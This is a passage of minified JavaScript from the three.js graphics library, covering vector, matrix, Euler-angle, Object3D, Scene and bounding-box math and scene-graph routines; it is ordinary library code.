this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this},roundToZero:function(){return this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x),this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y),this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z),this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this},dot:function(t){return this.x*t.x+this.y*t.y+this.z*t.z+this.w*t.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this.w+=(t.w-this.w)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},equals:function(t){return t.x===this.x&&t.y===this.y&&t.z===this.z&&t.w===this.w},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this.z=t[e+2],this.w=t[e+3],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t[e+3]=this.w,t},fromBufferAttribute:function(t,e,i){return void 0!==i&&console.warn("THREE.Vector4: offset has been removed from .fromBufferAttribute()."),this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this.w=t.getW(e),this}}),l.prototype=Object.assign(Object.create(e.prototype),{constructor:l,isWebGLRenderTarget:!0,setSize:function(t,e){this.width===t&&this.height===e||(this.width=t,this.height=e,this.texture.image.width=t,this.texture.image.height=e,this.dispose()),this.viewport.set(0,0,t,e),this.scissor.set(0,0,t,e)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.width=t.width,this.height=t.height,this.viewport.copy(t.viewport),this.texture=t.texture.clone(),this.depthBuffer=t.depthBuffer,this.stencilBuffer=t.stencilBuffer,this.depthTexture=t.depthTexture,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),c.prototype=Object.assign(Object.create(l.prototype),{constructor:c,isWebGLMultisampleRenderTarget:!0,copy:function(t){return l.prototype.copy.call(this,t),this.samples=t.samples,this}});var za=new r,Da=new h,Na=new r(0,0,0),ka=new r(1,1,1),Ba=new r,Fa=new r,Ha=new r;Object.assign(h.prototype,{isMatrix4:!0,set:function(t,e,i,n,r,a,o,s,l,c,h,u,d,p,f,m){var g=this.elements;return g[0]=t,g[4]=e,g[8]=i,g[12]=n,g[1]=r,g[5]=a,g[9]=o,g[13]=s,g[2]=l,g[6]=c,g[10]=h,g[14]=u,g[3]=d,g[7]=p,g[11]=f,g[15]=m,this},identity:function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this},clone:function(){return(new h).fromArray(this.elements)},copy:function(t){var e=this.elements;return t=t.elements,e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],e[9]=t[9],e[10]=t[10],e[11]=t[11],e[12]=t[12],e[13]=t[13],e[14]=t[14],e[15]=t[15],this},copyPosition:function(t){var e=this.elements;return t=t.elements,e[12]=t[12],e[13]=t[13],e[14]=t[14],this},extractBasis:function(t,e,i){return t.setFromMatrixColumn(this,0),e.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this},makeBasis:function(t,e,i){return this.set(t.x,e.x,i.x,0,t.y,e.y,i.y,0,t.z,e.z,i.z,0,0,0,0,1),this},extractRotation:function(t){var e=this.elements,i=t.elements,n=1/za.setFromMatrixColumn(t,0).length(),r=1/za.setFromMatrixColumn(t,1).length();return t=1/za.setFromMatrixColumn(t,2).length(),e[0]=i[0]*n,e[1]=i[1]*n,e[2]=i[2]*n,e[3]=0,e[4]=i[4]*r,e[5]=i[5]*r,e[6]=i[6]*r,e[7]=0,e[8]=i[8]*t,e[9]=i[9]*t,e[10]=i[10]*t,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this},makeRotationFromEuler:function(t){t&&t.isEuler||console.error("THREE.Matrix4: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.");var e=this.elements,i=t.x,n=t.y,r=t.z,a=Math.cos(i);i=Math.sin(i);var o=Math.cos(n);n=Math.sin(n);var s=Math.cos(r);if(r=Math.sin(r),"XYZ"===t.order){t=a*s;var l=a*r,c=i*s,h=i*r;e[0]=o*s,e[4]=-o*r,e[8]=n,e[1]=l+c*n,e[5]=t-h*n,e[9]=-i*o,e[2]=h-t*n,e[6]=c+l*n,e[10]=a*o}else"YXZ"===t.order?(t=o*s,l=o*r,c=n*s,h=n*r,e[0]=t+h*i,e[4]=c*i-l,e[8]=a*n,e[1]=a*r,e[5]=a*s,e[9]=-i,e[2]=l*i-c,e[6]=h+t*i,e[10]=a*o):"ZXY"===t.order?(t=o*s,l=o*r,c=n*s,h=n*r,e[0]=t-h*i,e[4]=-a*r,e[8]=c+l*i,e[1]=l+c*i,e[5]=a*s,e[9]=h-t*i,e[2]=-a*n,e[6]=i,e[10]=a*o):"ZYX"===t.order?(t=a*s,l=a*r,c=i*s,h=i*r,e[0]=o*s,e[4]=c*n-l,e[8]=t*n+h,e[1]=o*r,e[5]=h*n+t,e[9]=l*n-c,e[2]=-n,e[6]=i*o,e[10]=a*o):"YZX"===t.order?(t=a*o,l=a*n,c=i*o,h=i*n,e[0]=o*s,e[4]=h-t*r,e[8]=c*r+l,e[1]=r,e[5]=a*s,e[9]=-i*s,e[2]=-n*s,e[6]=l*r+c,e[10]=t-h*r):"XZY"===t.order&&(t=a*o,l=a*n,c=i*o,h=i*n,e[0]=o*s,e[4]=-r,e[8]=n*s,e[1]=t*r+h,e[5]=a*s,e[9]=l*r-c,e[2]=c*r-l,e[6]=i*s,e[10]=h*r+t);return e[3]=0,e[7]=0,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this},makeRotationFromQuaternion:function(t){return this.compose(Na,t,ka)},lookAt:function(t,e,i){var n=this.elements;return Ha.subVectors(t,e),0===Ha.lengthSq()&&(Ha.z=1),Ha.normalize(),Ba.crossVectors(i,Ha),0===Ba.lengthSq()&&(1===Math.abs(i.z)?Ha.x+=1e-4:Ha.z+=1e-4,Ha.normalize(),Ba.crossVectors(i,Ha)),Ba.normalize(),Fa.crossVectors(Ha,Ba),n[0]=Ba.x,n[4]=Fa.x,n[8]=Ha.x,n[1]=Ba.y,n[5]=Fa.y,n[9]=Ha.y,n[2]=Ba.z,n[6]=Fa.z,n[10]=Ha.z,this},multiply:function(t,e){return void 0!==e?(console.warn("THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead."),this.multiplyMatrices(t,e)):this.multiplyMatrices(this,t)},premultiply:function(t){return this.multiplyMatrices(t,this)},multiplyMatrices:function(t,e){var i=t.elements,n=e.elements;e=this.elements,t=i[0];var r=i[4],a=i[8],o=i[12],s=i[1],l=i[5],c=i[9],h=i[13],u=i[2],d=i[6],p=i[10],f=i[14],m=i[3],g=i[7],v=i[11];i=i[15];var y=n[0],x=n[4],b=n[8],w=n[12],_=n[1],M=n[5],S=n[9],T=n[13],E=n[2],C=n[6],A=n[10],L=n[14],P=n[3],R=n[7],O=n[11];return n=n[15],e[0]=t*y+r*_+a*E+o*P,e[4]=t*x+r*M+a*C+o*R,e[8]=t*b+r*S+a*A+o*O,e[12]=t*w+r*T+a*L+o*n,e[1]=s*y+l*_+c*E+h*P,e[5]=s*x+l*M+c*C+h*R,e[9]=s*b+l*S+c*A+h*O,e[13]=s*w+l*T+c*L+h*n,e[2]=u*y+d*_+p*E+f*P,e[6]=u*x+d*M+p*C+f*R,e[10]=u*b+d*S+p*A+f*O,e[14]=u*w+d*T+p*L+f*n,e[3]=m*y+g*_+v*E+i*P,e[7]=m*x+g*M+v*C+i*R,e[11]=m*b+g*S+v*A+i*O,e[15]=m*w+g*T+v*L+i*n,this},multiplyScalar:function(t){var e=this.elements;return e[0]*=t,e[4]*=t,e[8]*=t,e[12]*=t,e[1]*=t,e[5]*=t,e[9]*=t,e[13]*=t,e[2]*=t,e[6]*=t,e[10]*=t,e[14]*=t,e[3]*=t,e[7]*=t,e[11]*=t,e[15]*=t,this},applyToBufferAttribute:function(t){for(var e=0,i=t.count;e<i;e++)za.x=t.getX(e),za.y=t.getY(e),za.z=t.getZ(e),za.applyMatrix4(this),t.setXYZ(e,za.x,za.y,za.z);return t},determinant:function(){var t=this.elements,e=t[0],i=t[4],n=t[8],r=t[12],a=t[1],o=t[5],s=t[9],l=t[13],c=t[2],h=t[6],u=t[10],d=t[14];return t[3]*(+r*s*h-n*l*h-r*o*u+i*l*u+n*o*d-i*s*d)+t[7]*(+e*s*d-e*l*u+r*a*u-n*a*d+n*l*c-r*s*c)+t[11]*(+e*l*h-e*o*d-r*a*h+i*a*d+r*o*c-i*l*c)+t[15]*(-n*o*c-e*s*h+e*o*u+n*a*h-i*a*u+i*s*c)},transpose:function(){var t=this.elements,e=t[1];return t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this},setPosition:function(t,e,i){var n=this.elements;return t.isVector3?(n[12]=t.x,n[13]=t.y,n[14]=t.z):(n[12]=t,n[13]=e,n[14]=i),this},getInverse:function(t,e){var i=this.elements,n=t.elements;t=n[0];var r=n[1],a=n[2],o=n[3],s=n[4],l=n[5],c=n[6],h=n[7],u=n[8],d=n[9],p=n[10],f=n[11],m=n[12],g=n[13],v=n[14],y=d*v*h-g*p*h+g*c*f-l*v*f-d*c*(n=n[15])+l*p*n,x=m*p*h-u*v*h-m*c*f+s*v*f+u*c*n-s*p*n,b=u*g*h-m*d*h+m*l*f-s*g*f-u*l*n+s*d*n,w=m*d*c-u*g*c-m*l*p+s*g*p+u*l*v-s*d*v,_=t*y+r*x+a*b+o*w;if(0===_){if(!0===e)throw Error("THREE.Matrix4: .getInverse() can't invert matrix, determinant is 0");return console.warn("THREE.Matrix4: .getInverse() can't invert matrix, determinant is 0"),this.identity()}return e=1/_,i[0]=y*e,i[1]=(g*p*o-d*v*o-g*a*f+r*v*f+d*a*n-r*p*n)*e,i[2]=(l*v*o-g*c*o+g*a*h-r*v*h-l*a*n+r*c*n)*e,i[3]=(d*c*o-l*p*o-d*a*h+r*p*h+l*a*f-r*c*f)*e,i[4]=x*e,i[5]=(u*v*o-m*p*o+m*a*f-t*v*f-u*a*n+t*p*n)*e,i[6]=(m*c*o-s*v*o-m*a*h+t*v*h+s*a*n-t*c*n)*e,i[7]=(s*p*o-u*c*o+u*a*h-t*p*h-s*a*f+t*c*f)*e,i[8]=b*e,i[9]=(m*d*o-u*g*o-m*r*f+t*g*f+u*r*n-t*d*n)*e,i[10]=(s*g*o-m*l*o+m*r*h-t*g*h-s*r*n+t*l*n)*e,i[11]=(u*l*o-s*d*o-u*r*h+t*d*h+s*r*f-t*l*f)*e,i[12]=w*e,i[13]=(u*g*a-m*d*a+m*r*p-t*g*p-u*r*v+t*d*v)*e,i[14]=(m*l*a-s*g*a-m*r*c+t*g*c+s*r*v-t*l*v)*e,i[15]=(s*d*a-u*l*a+u*r*c-t*d*c-s*r*p+t*l*p)*e,this},scale:function(t){var e=this.elements,i=t.x,n=t.y;return t=t.z,e[0]*=i,e[4]*=n,e[8]*=t,e[1]*=i,e[5]*=n,e[9]*=t,e[2]*=i,e[6]*=n,e[10]*=t,e[3]*=i,e[7]*=n,e[11]*=t,this},getMaxScaleOnAxis:function(){var t=this.elements;return Math.sqrt(Math.max(t[0]*t[0]+t[1]*t[1]+t[2]*t[2],t[4]*t[4]+t[5]*t[5]+t[6]*t[6],t[8]*t[8]+t[9]*t[9]+t[10]*t[10]))},makeTranslation:function(t,e,i){return this.set(1,0,0,t,0,1,0,e,0,0,1,i,0,0,0,1),this},makeRotationX:function(t){var e=Math.cos(t);return t=Math.sin(t),this.set(1,0,0,0,0,e,-t,0,0,t,e,0,0,0,0,1),this},makeRotationY:function(t){var e=Math.cos(t);return t=Math.sin(t),this.set(e,0,t,0,0,1,0,0,-t,0,e,0,0,0,0,1),this},makeRotationZ:function(t){var e=Math.cos(t);return t=Math.sin(t),this.set(e,-t,0,0,t,e,0,0,0,0,1,0,0,0,0,1),this},makeRotationAxis:function(t,e){var i=Math.cos(e);e=Math.sin(e);var n=1-i,r=t.x,a=t.y;t=t.z;var o=n*r,s=n*a;return this.set(o*r+i,o*a-e*t,o*t+e*a,0,o*a+e*t,s*a+i,s*t-e*r,0,o*t-e*a,s*t+e*r,n*t*t+i,0,0,0,0,1),this},makeScale:function(t,e,i){return this.set(t,0,0,0,0,e,0,0,0,0,i,0,0,0,0,1),this},makeShear:function(t,e,i){return this.set(1,e,i,0,t,1,i,0,t,e,1,0,0,0,0,1),this},compose:function(t,e,i){var n=this.elements,r=e._x,a=e._y,o=e._z,s=e._w,l=r+r,c=a+a,h=o+o;e=r*l;var u=r*c;r*=h;var d=a*c;a*=h,o*=h,l*=s,c*=s,s*=h,h=i.x;var p=i.y;return i=i.z,n[0]=(1-(d+o))*h,n[1]=(u+s)*h,n[2]=(r-c)*h,n[3]=0,n[4]=(u-s)*p,n[5]=(1-(e+o))*p,n[6]=(a+l)*p,n[7]=0,n[8]=(r+c)*i,n[9]=(a-l)*i,n[10]=(1-(e+d))*i,n[11]=0,n[12]=t.x,n[13]=t.y,n[14]=t.z,n[15]=1,this},decompose:function(t,e,i){var n=this.elements,r=za.set(n[0],n[1],n[2]).length(),a=za.set(n[4],n[5],n[6]).length(),o=za.set(n[8],n[9],n[10]).length();0>this.determinant()&&(r=-r),t.x=n[12],t.y=n[13],t.z=n[14],Da.copy(this),t=1/r,n=1/a;var s=1/o;return Da.elements[0]*=t,Da.elements[1]*=t,Da.elements[2]*=t,Da.elements[4]*=n,Da.elements[5]*=n,Da.elements[6]*=n,Da.elements[8]*=s,Da.elements[9]*=s,Da.elements[10]*=s,e.setFromRotationMatrix(Da),i.x=r,i.y=a,i.z=o,this},makePerspective:function(t,e,i,n,r,a){void 0===a&&console.warn("THREE.Matrix4: .makePerspective() has been redefined and has a new signature. Please check the docs.");var o=this.elements;return o[0]=2*r/(e-t),o[4]=0,o[8]=(e+t)/(e-t),o[12]=0,o[1]=0,o[5]=2*r/(i-n),o[9]=(i+n)/(i-n),o[13]=0,o[2]=0,o[6]=0,o[10]=-(a+r)/(a-r),o[14]=-2*a*r/(a-r),o[3]=0,o[7]=0,o[11]=-1,o[15]=0,this},makeOrthographic:function(t,e,i,n,r,a){var o=this.elements,s=1/(e-t),l=1/(i-n),c=1/(a-r);return o[0]=2*s,o[4]=0,o[8]=0,o[12]=-(e+t)*s,o[1]=0,o[5]=2*l,o[9]=0,o[13]=-(i+n)*l,o[2]=0,o[6]=0,o[10]=-2*c,o[14]=-(a+r)*c,o[3]=0,o[7]=0,o[11]=0,o[15]=1,this},equals:function(t){var e=this.elements;t=t.elements;for(var i=0;16>i;i++)if(e[i]!==t[i])return!1;return!0},fromArray:function(t,e){void 0===e&&(e=0);for(var i=0;16>i;i++)this.elements[i]=t[i+e];return this},toArray:function(t,e){void 0===t&&(t=[]),void 0===e&&(e=0);var i=this.elements;return t[e]=i[0],t[e+1]=i[1],t[e+2]=i[2],t[e+3]=i[3],t[e+4]=i[4],t[e+5]=i[5],t[e+6]=i[6],t[e+7]=i[7],t[e+8]=i[8],t[e+9]=i[9],t[e+10]=i[10],t[e+11]=i[11],t[e+12]=i[12],t[e+13]=i[13],t[e+14]=i[14],t[e+15]=i[15],t}});var Ga=new h,ja=new n;u.RotationOrders="XYZ YZX ZXY XZY YXZ ZYX".split(" "),u.DefaultOrder="XYZ",Object.defineProperties(u.prototype,{x:{get:function(){return this._x},set:function(t){this._x=t,this._onChangeCallback()}},y:{get:function(){return this._y},set:function(t){this._y=t,this._onChangeCallback()}},z:{get:function(){return this._z},set:function(t){this._z=t,this._onChangeCallback()}},order:{get:function(){return this._order},set:function(t){this._order=t,this._onChangeCallback()}}}),Object.assign(u.prototype,{isEuler:!0,set:function(t,e,i,n){return this._x=t,this._y=e,this._z=i,this._order=n||this._order,this._onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._order)},copy:function(t){return this._x=t._x,this._y=t._y,this._z=t._z,this._order=t._order,this._onChangeCallback(),this},setFromRotationMatrix:function(t,e,i){var n=Ca.clamp,r=t.elements;t=r[0];var a=r[4],o=r[8],s=r[1],l=r[5],c=r[9],h=r[2],u=r[6];return r=r[10],"XYZ"===(e=e||this._order)?(this._y=Math.asin(n(o,-1,1)),.9999999>Math.abs(o)?(this._x=Math.atan2(-c,r),this._z=Math.atan2(-a,t)):(this._x=Math.atan2(u,l),this._z=0)):"YXZ"===e?(this._x=Math.asin(-n(c,-1,1)),.9999999>Math.abs(c)?(this._y=Math.atan2(o,r),this._z=Math.atan2(s,l)):(this._y=Math.atan2(-h,t),this._z=0)):"ZXY"===e?(this._x=Math.asin(n(u,-1,1)),.9999999>Math.abs(u)?(this._y=Math.atan2(-h,r),this._z=Math.atan2(-a,l)):(this._y=0,this._z=Math.atan2(s,t))):"ZYX"===e?(this._y=Math.asin(-n(h,-1,1)),.9999999>Math.abs(h)?(this._x=Math.atan2(u,r),this._z=Math.atan2(s,t)):(this._x=0,this._z=Math.atan2(-a,l))):"YZX"===e?(this._z=Math.asin(n(s,-1,1)),.9999999>Math.abs(s)?(this._x=Math.atan2(-c,l),this._y=Math.atan2(-h,t)):(this._x=0,this._y=Math.atan2(o,r))):"XZY"===e?(this._z=Math.asin(-n(a,-1,1)),.9999999>Math.abs(a)?(this._x=Math.atan2(u,l),this._y=Math.atan2(o,t)):(this._x=Math.atan2(-c,r),this._y=0)):console.warn("THREE.Euler: .setFromRotationMatrix() given unsupported order: "+e),this._order=e,!1!==i&&this._onChangeCallback(),this},setFromQuaternion:function(t,e,i){return Ga.makeRotationFromQuaternion(t),this.setFromRotationMatrix(Ga,e,i)},setFromVector3:function(t,e){return this.set(t.x,t.y,t.z,e||this._order)},reorder:function(t){return ja.setFromEuler(this),this.setFromQuaternion(ja,t)},equals:function(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._order===this._order},fromArray:function(t){return this._x=t[0],this._y=t[1],this._z=t[2],void 0!==t[3]&&(this._order=t[3]),this._onChangeCallback(),this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._order,t},toVector3:function(t){return t?t.set(this._x,this._y,this._z):new r(this._x,this._y,this._z)},_onChange:function(t){return this._onChangeCallback=t,this},_onChangeCallback:function(){}}),Object.assign(d.prototype,{set:function(t){this.mask=1<<t|0},enable:function(t){this.mask=this.mask|1<<t|0},enableAll:function(){this.mask=-1},toggle:function(t){this.mask^=1<<t|0},disable:function(t){this.mask&=~(1<<t|0)},disableAll:function(){this.mask=0},test:function(t){return 0!=(this.mask&t.mask)}});var Ua=0,Va=new r,Wa=new n,qa=new h,Xa=new r,Ya=new r,$a=new r,Za=new n,Ja=new r(1,0,0),Ka=new r(0,1,0),Qa=new r(0,0,1),to={type:"added"},eo={type:"removed"};p.DefaultUp=new r(0,1,0),p.DefaultMatrixAutoUpdate=!0,p.prototype=Object.assign(Object.create(e.prototype),{constructor:p,isObject3D:!0,onBeforeRender:function(){},onAfterRender:function(){},applyMatrix:function(t){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(t),this.matrix.decompose(this.position,this.quaternion,this.scale)},applyQuaternion:function(t){return this.quaternion.premultiply(t),this},setRotationFromAxisAngle:function(t,e){this.quaternion.setFromAxisAngle(t,e)},setRotationFromEuler:function(t){this.quaternion.setFromEuler(t,!0)},setRotationFromMatrix:function(t){this.quaternion.setFromRotationMatrix(t)},setRotationFromQuaternion:function(t){this.quaternion.copy(t)},rotateOnAxis:function(t,e){return Wa.setFromAxisAngle(t,e),this.quaternion.multiply(Wa),this},rotateOnWorldAxis:function(t,e){return Wa.setFromAxisAngle(t,e),this.quaternion.premultiply(Wa),this},rotateX:function(t){return this.rotateOnAxis(Ja,t)},rotateY:function(t){return this.rotateOnAxis(Ka,t)},rotateZ:function(t){return this.rotateOnAxis(Qa,t)},translateOnAxis:function(t,e){return Va.copy(t).applyQuaternion(this.quaternion),this.position.add(Va.multiplyScalar(e)),this},translateX:function(t){return this.translateOnAxis(Ja,t)},translateY:function(t){return this.translateOnAxis(Ka,t)},translateZ:function(t){return this.translateOnAxis(Qa,t)},localToWorld:function(t){return t.applyMatrix4(this.matrixWorld)},worldToLocal:function(t){return t.applyMatrix4(qa.getInverse(this.matrixWorld))},lookAt:function(t,e,i){t.isVector3?Xa.copy(t):Xa.set(t,e,i),t=this.parent,this.updateWorldMatrix(!0,!1),Ya.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?qa.lookAt(Ya,Xa,this.up):qa.lookAt(Xa,Ya,this.up),this.quaternion.setFromRotationMatrix(qa),t&&(qa.extractRotation(t.matrixWorld),Wa.setFromRotationMatrix(qa),this.quaternion.premultiply(Wa.inverse()))},add:function(t){if(1<arguments.length){for(var e=0;e<arguments.length;e++)this.add(arguments[e]);return this}return t===this?(console.error("THREE.Object3D.add: object can't be added as a child of itself.",t),this):(t&&t.isObject3D?(null!==t.parent&&t.parent.remove(t),t.parent=this,this.children.push(t),t.dispatchEvent(to)):console.error("THREE.Object3D.add: object not an instance of THREE.Object3D.",t),this)},remove:function(t){if(1<arguments.length){for(var e=0;e<arguments.length;e++)this.remove(arguments[e]);return this}return-1!==(e=this.children.indexOf(t))&&(t.parent=null,this.children.splice(e,1),t.dispatchEvent(eo)),this},attach:function(t){return this.updateWorldMatrix(!0,!1),qa.getInverse(this.matrixWorld),null!==t.parent&&(t.parent.updateWorldMatrix(!0,!1),qa.multiply(t.parent.matrixWorld)),t.applyMatrix(qa),t.updateWorldMatrix(!1,!1),this.add(t),this},getObjectById:function(t){return this.getObjectByProperty("id",t)},getObjectByName:function(t){return this.getObjectByProperty("name",t)},getObjectByProperty:function(t,e){if(this[t]===e)return this;for(var i=0,n=this.children.length;i<n;i++){var r=this.children[i].getObjectByProperty(t,e);if(void 0!==r)return r}},getWorldPosition:function(t){return void 0===t&&(console.warn("THREE.Object3D: .getWorldPosition() target is now required"),t=new r),this.updateMatrixWorld(!0),t.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(t){return void 0===t&&(console.warn("THREE.Object3D: .getWorldQuaternion() target is now required"),t=new n),this.updateMatrixWorld(!0),this.matrixWorld.decompose(Ya,t,$a),t},getWorldScale:function(t){return void 0===t&&(console.warn("THREE.Object3D: .getWorldScale() target is now required"),t=new r),this.updateMatrixWorld(!0),this.matrixWorld.decompose(Ya,Za,t),t},getWorldDirection:function(t){void 0===t&&(console.warn("THREE.Object3D: .getWorldDirection() target is now required"),t=new r),this.updateMatrixWorld(!0);var e=this.matrixWorld.elements;return t.set(e[8],e[9],e[10]).normalize()},raycast:function(){},traverse:function(t){t(this);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].traverse(t)},traverseVisible:function(t){if(!1!==this.visible){t(this);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].traverseVisible(t)}},traverseAncestors:function(t){var e=this.parent;null!==e&&(t(e),e.traverseAncestors(t))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(t){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||t)&&(null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,t=!0);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].updateMatrixWorld(t)},updateWorldMatrix:function(t,e){var i=this.parent;if(!0===t&&null!==i&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),!0===e)for(e=0,i=(t=this.children).length;e<i;e++)t[e].updateWorldMatrix(!1,!0)},toJSON:function(t){function e(e,i){return void 0===e[i.uuid]&&(e[i.uuid]=i.toJSON(t)),i.uuid}function i(t){var e,i=[];for(e in t){var n=t[e];delete n.metadata,i.push(n)}return i}var n=void 0===t||"string"==typeof t,r={};n&&(t={geometries:{},materials:{},textures:{},images:{},shapes:{}},r.metadata={version:4.5,type:"Object",generator:"Object3D.toJSON"});var a={};if(a.uuid=this.uuid,a.type=this.type,""!==this.name&&(a.name=this.name),!0===this.castShadow&&(a.castShadow=!0),!0===this.receiveShadow&&(a.receiveShadow=!0),!1===this.visible&&(a.visible=!1),!1===this.frustumCulled&&(a.frustumCulled=!1),0!==this.renderOrder&&(a.renderOrder=this.renderOrder),"{}"!==JSON.stringify(this.userData)&&(a.userData=this.userData),a.layers=this.layers.mask,a.matrix=this.matrix.toArray(),!1===this.matrixAutoUpdate&&(a.matrixAutoUpdate=!1),this.isMesh&&0!==this.drawMode&&(a.drawMode=this.drawMode),this.isMesh||this.isLine||this.isPoints){a.geometry=e(t.geometries,this.geometry);var o=this.geometry.parameters;if(void 0!==o&&void 0!==o.shapes)if(o=o.shapes,Array.isArray(o))for(var s=0,l=o.length;s<l;s++)e(t.shapes,o[s]);else e(t.shapes,o)}if(void 0!==this.material)if(Array.isArray(this.material)){for(o=[],s=0,l=this.material.length;s<l;s++)o.push(e(t.materials,this.material[s]));a.material=o}else a.material=e(t.materials,this.material);if(0<this.children.length)for(a.children=[],s=0;s<this.children.length;s++)a.children.push(this.children[s].toJSON(t).object);if(n){n=i(t.geometries),s=i(t.materials),l=i(t.textures);var c=i(t.images);o=i(t.shapes),0<n.length&&(r.geometries=n),0<s.length&&(r.materials=s),0<l.length&&(r.textures=l),0<c.length&&(r.images=c),0<o.length&&(r.shapes=o)}return r.object=a,r},clone:function(t){return(new this.constructor).copy(this,t)},copy:function(t,e){if(void 0===e&&(e=!0),this.name=t.name,this.up.copy(t.up),this.position.copy(t.position),this.quaternion.copy(t.quaternion),this.scale.copy(t.scale),this.matrix.copy(t.matrix),this.matrixWorld.copy(t.matrixWorld),this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrixWorldNeedsUpdate=t.matrixWorldNeedsUpdate,this.layers.mask=t.layers.mask,this.visible=t.visible,this.castShadow=t.castShadow,this.receiveShadow=t.receiveShadow,this.frustumCulled=t.frustumCulled,this.renderOrder=t.renderOrder,this.userData=JSON.parse(JSON.stringify(t.userData)),!0===e)for(e=0;e<t.children.length;e++)this.add(t.children[e].clone());return this}}),f.prototype=Object.assign(Object.create(p.prototype),{constructor:f,isScene:!0,copy:function(t,e){return p.prototype.copy.call(this,t,e),null!==t.background&&(this.background=t.background.clone()),null!==t.fog&&(this.fog=t.fog.clone()),null!==t.overrideMaterial&&(this.overrideMaterial=t.overrideMaterial.clone()),this.autoUpdate=t.autoUpdate,this.matrixAutoUpdate=t.matrixAutoUpdate,this},toJSON:function(t){var e=p.prototype.toJSON.call(this,t);return null!==this.background&&(e.object.background=this.background.toJSON(t)),null!==this.fog&&(e.object.fog=this.fog.toJSON()),e},dispose:function(){this.dispatchEvent({type:"dispose"})}});var io=[new r,new r,new r,new r,new r,new r,new r,new r],no=new r,ro=new r,ao=new r,oo=new r,so=new r,lo=new r,co=new r,ho=new r,uo=new r,po=new r,fo=new r;Object.assign(m.prototype,{isBox3:!0,set:function(t,e){return this.min.copy(t),this.max.copy(e),this},setFromArray:function(t){for(var e=1/0,i=1/0,n=1/0,r=-1/0,a=-1/0,o=-1/0,s=0,l=t.length;s<l;s+=3){var c=t[s],h=t[s+1],u=t[s+2];c<e&&(e=c),h<i&&(i=h),u<n&&(n=u),c>r&&(r=c),h>a&&(a=h),u>o&&(o=u)}return this.min.set(e,i,n),this.max.set(r,a,o),this},setFromBufferAttribute:function(t){for(var e=1/0,i=1/0,n=1/0,r=-1/0,a=-1/0,o=-1/0,s=0,l=t.count;s<l;s++){var c=t.getX(s),h=t.getY(s),u=t.getZ(s);c<e&&(e=c),h<i&&(i=h),u<n&&(n=u),c>r&&(r=c),h>a&&(a=h),u>o&&(o=u)}return this.min.set(e,i,n),this.max.set(r,a,o),this},setFromPoints:function(t){this.makeEmpty();for(var e=0,i=t.length;e<i;e++)this.expandByPoint(t[e]);return this},setFromCenterAndSize:function(t,e){return e=no.copy(e).multiplyScalar(.5),this.min.copy(t).sub(e),this.max.copy(t).add(e),this},setFromObject:function(t){return this.makeEmpty(),this.expandByObject(t)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.min.copy(t.min),this.max.copy(t.max),this},makeEmpty:function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},getCenter:function(t){return void 0===t&&(console.warn("THREE.Box3: .getCenter() target is now required"),t=new 